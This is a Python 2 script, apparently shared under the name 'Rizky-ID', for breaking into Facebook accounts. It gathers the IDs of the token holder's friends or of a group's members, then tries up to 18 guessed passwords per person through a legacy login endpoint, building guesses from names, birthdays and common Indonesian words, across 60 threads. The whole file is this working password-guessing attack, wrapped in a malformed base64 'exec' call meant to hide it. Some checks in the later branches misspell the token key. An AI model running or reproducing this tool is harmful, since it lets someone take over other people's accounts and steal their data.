# author by : Rizky-ID
import base64
exec(base64.b64decode('import os, sys, time, datetime, random, threading, json, urllib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def run(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1)


back = 0
threads = []
berhasil = []
id = []
logo = '\n\x1b[36;1m     \xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xdb\xa9\xdb\xa9\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\x1b[32;1m      \xe2\x96\x84\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x80\xe2\x96\x88\xe2\x96\x80 \xe2\x96\x84\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x84 \xe2\x96\x84\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x80\n      \xe2\x96\x88\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x88  \xe2\x96\x88  \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x80\n      \xe2\x96\x80 \xe2\x96\x80  \xe2\x96\x80   \xe2\x96\x80   \xe2\x96\x80  \xe2\x96\x80   \xe2\x96\x80 \xe2\x96\x80\xe2\x96\x80  \xe2\x96\x80\n\x1b[36;1m     \xc2\xab--------------\xe2\x9c\xa7--------------\xc2\xbb\n\x1b[37;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'

def token():
    os.system('reset')
    print logo
    toket = raw_input('\x1b[32;1m{\x1b[37;1m=\x1b[32;1m}\x1b[37;1m Input Your Token Account\x1b[34;1m Fb\x1b[32;1m :\x1b[37;1m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        memeq = open('token.txt', 'w')
        memeq.write(toket)
        memeq.close()
        print '\x1b[32;1m{\x1b[37;1m=\x1b[32;1m}\x1b[37;1m Login As \x1b[31;1m:\x1b[36;1m ' + nama
        time.sleep(2.5)
        mbf()
    except KeyError:
        print '\x1b[32;1m{\x1b[31;1m!\x1b[32;1m}\x1b[37;1m Token\x1b[31;1m Wrong'
        time.sleep(2.8)
        token()
    except requests.exceptions.ConnectionError:
        print '\x1b[32;1m{\x1b[31;1mX\x1b[32;1m} \x1b[31;1mNot Connection'
        sys.exit()
    if 'checkpoint' in otw:
        print '\x1b[32;1m{\x1b[33;1m!\x1b[32;1m} \x1b[37;1mAccount \x1b[33;1mChekpoint'
        sys.exit()


def mbf():
    global toket
    os.system('reset')
    try:
        toket = open('token.txt', 'r').read()
    except IOError:
        print '\x1b[32;1m{!} \x1b[31;1mToken not found'
        os.system('rm -rf token.txt')
        time.sleep(1)
        token()

    os.system('reset')
    print logo
    print '\x1b[32;1m{\x1b[37;1m01\x1b[32;1m} \x1b[36;1mCRACK ID FRIENDS'
    print '\x1b[32;1m{\x1b[37;1m02\x1b[32;1m}\x1b[36;1m CRACK ID MEMBER GROUPS'
    print '\x1b[32;1m{\x1b[37;1m00\x1b[32;1m} \x1b[31;1mEXIT PROGRAM'
    print '\x1b[37;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    pilih_mbf()


def pilih_mbf():
    global okay
    peak = raw_input('\x1b[32;1m{\x1b[37;1m?\x1b[36;1m} \x1b[37;1mInput Number \x1b[31;1m: \x1b[36;1m')
    if peak == '':
        print '\x1b[32;1m[!] \x1b[31;1mJangan kosong'
        pilih_mbf()
    else:
        if peak == '1' or peak == '01':
            os.system('reset')
            print logo
            run('\033[32;1m[+]\033[37;1m Sedang Mengumpulkan ID Teman')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2' or peak == '02':
                os.system('reset')
                print logo
                idg = raw_input('\x1b[36;1m{\x1b[37;1m?\x1b[36;1m}\x1b[37;1m Input Your ID Groups \x1b[31;1m:\x1b[36;1m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[36;1m{\x1b[37;1m~\x1b[36;1m}\x1b[37;1m Name Groups\x1b[31;1m : \x1b[36;1m' + asw['name']
                except KeyError:
                    print '\x1b[32;1m[!] \x1b[37;1mGroups Not Found'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack Menu \x1b[1;91m]')
                    mbf()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0' or peak == '00':
                    os.system('rm -rf token.txt')
                    print '\x1b[32;1m{\x1b[34;1m-\x1b[32;1m}\x1b[37;1m Program\x1b[31;1m Finished'
                    sys.exit()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_mbf()
    print '\033[32;1m[+]\033[37;1m Total ID Teman \033[31;1m: \033[36;1m' + str(len(id))
    titik = ['.   ', '..  ', '... ', '.... ']
    for o in titik:
        print '\r\r\033[32;1m[-]\033[37;1m Cracking Start\033[32;1m ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\n\x1b[37;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass2
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass3
                        else:
                            lahir = b['birthday']
                            pass4 = lahir.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass4
                            else:
                                pass5 = 'sayang'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass5
                                else:
                                    pass6 = 'doraemon'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass6
                                    else:
                                        pass7 = 'anonymous'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass7
                                        else:
                                            pass8 = b['last_name'] + '12345'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass8
                                            else:
                                                pass9 = 'indonesia'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'acces_token' in q:
                                                    print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass9
                                                else:
                                                    pass10 = 'akusayangkamu'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'acces_token' in q:
                                                        print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass10
                                                    else:
                                                        pass11 = 'anjing'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'acces_token' in q:
                                                            print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass11
                                                        else:
                                                            pass12 = 'kontol'
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'acces_token' in q:
                                                                print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass12
                                                            else:
                                                                pass13 = b['first_name'] + '321'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'acces_token' in q:
                                                                    print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass13
                                                                else:
                                                                    pass14 = b['first_name'] + '54321'
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'acces_token' in q:
                                                                        print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass14
                                                                    else:
                                                                        pass15 = b['last_name'] + '321'
                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        q = json.load(data)
                                                                        if 'acces_token' in q:
                                                                            print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass15
                                                                        else:
                                                                            pass16 = b['last_name'] + '54321'
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            q = json.load(data)
                                                                            if 'acces_token' in q:
                                                                                print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass16
                                                                            else:
                                                                                pass17 = 'bangsat'
                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                q = json.load(data)
                                                                                if 'acces_token' in q:
                                                                                    print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass17
                                                                                else:
                                                                                    pass18 = 'jancok123'
                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                    q = json.load(data)
                                                                                    if 'acces_token' in q:
                                                                                    	print '\x1b[37;1m[\x1b[32;1m OK\xe2\x9c\x93 \x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass18
        except:
            pass

    p = ThreadPool(60)
    p.map(main, id)
    print '\x1b[37;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    run('\x1b[32;1m{\x1b[34;1m-\x1b[32;1m}\x1b[37;1m Program\x1b[31;1m Finished')
    os.system('rm -rf token.txt')
    sys.exit()


if __name__ == '__main__':
    token()
'))